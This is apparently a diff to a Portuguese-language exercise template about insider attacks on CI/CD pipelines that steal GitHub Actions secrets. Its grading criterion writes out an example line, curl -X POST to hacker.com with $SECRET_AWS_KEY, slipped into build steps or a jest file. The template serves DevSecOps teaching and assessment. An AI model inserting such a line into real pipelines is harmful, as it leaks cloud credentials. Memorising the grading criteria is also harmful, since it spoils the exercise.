@@ -10,7 +10,7 @@ Um engenheiro sênior no Github ativou uma regra perigosa: "Qualquer Pull Reques
 Cenário: Ameaça Interna CI/CD, Pwned Actions Environment Secrets.
 
 Tarefa: Minha narrativa do ataque no Pipeline que o Devsecops precisa prevenir:
-[COLE AQUI]
+[COLE SUA RESPOSTA AQUI]
 
 Critérios de correção:
 1. Demonstrei que o hacker altera o arquivo de testes `jest` ou o arquivo `.yml` inserindo um mero `curl -X POST hacker.com/log -d "$SECRET_AWS_KEY"` no meio dos steps de Build?
